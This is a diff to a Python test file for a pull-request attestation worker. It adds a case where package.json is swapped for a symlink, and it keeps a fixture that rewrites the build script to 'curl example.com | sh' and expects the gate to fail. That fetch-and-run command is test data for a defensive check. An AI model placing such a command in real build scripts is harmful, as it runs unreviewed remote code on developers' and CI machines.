@@ -335,14 +335,15 @@ _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite
 
 
 @pytest.mark.parametrize(
-    "files, compare_files, manifest_head, expect_reason",
+    "files, compare_files, manifest_head, head_link, expect_reason",
     [
-        pytest.param(["src/util.py"], ["src/util.py"], None, "", id="pinned-list-matches"),
-        pytest.param(["src/util.py"], ["terraform/main.tf"], None, "file_list_moved", id="pinned-list-moved"),
+        pytest.param(["src/util.py"], ["src/util.py"], None, None, "", id="pinned-list-matches"),
+        pytest.param(["src/util.py"], ["terraform/main.tf"], None, None, "file_list_moved", id="pinned-list-moved"),
         pytest.param(
             ["frontend/package.json"],
             ["frontend/package.json"],
             _MANIFEST_BASE.replace("1.0.0", "1.0.1"),
+            None,
             "",
             id="manifest-version-bump",
         ),
@@ -350,8 +351,17 @@ _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite
             ["frontend/package.json"],
             ["frontend/package.json"],
             _MANIFEST_BASE.replace("vite build", "curl example.com | sh"),
+            None,
             "gate_failed",
             id="manifest-script-edit",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            None,
+            "package.base.json",
+            "gate_failed",
+            id="manifest-replaced-by-a-symlink",
         ),
     ],
 )
@@ -362,6 +372,7 @@ def test_the_worker_attests_from_the_reviewed_commits(
     files: list[str],
     compare_files: list[str],
     manifest_head: str | None,
+    head_link: str | None,
     expect_reason: str,
 ) -> None:
     repo_config = _repo_config(team.id)
@@ -369,9 +380,12 @@ def test_the_worker_attests_from_the_reviewed_commits(
     author, head_sha = "devex-dev", "sha103a"
     recorder.register_pr(REPO, 103, _pr_object(103, author, head_sha), [_api_file(path) for path in files])
     recorder.compare_files = [_api_file(path) for path in compare_files]
-    if manifest_head is not None:
+    if manifest_head is not None or head_link is not None:
         recorder.files_at_ref[("frontend/package.json", recorder.merge_base_sha)] = _MANIFEST_BASE
+    if manifest_head is not None:
         recorder.files_at_ref[("frontend/package.json", head_sha)] = manifest_head
+    if head_link is not None:
+        recorder.repo_symlinks[(REPO, "frontend/package.json")] = head_link
     stamphog_chain.attest_gates.side_effect = _attest_gates
 
     with patch.object(activities, "fetch_folder_policy_files", return_value={}):
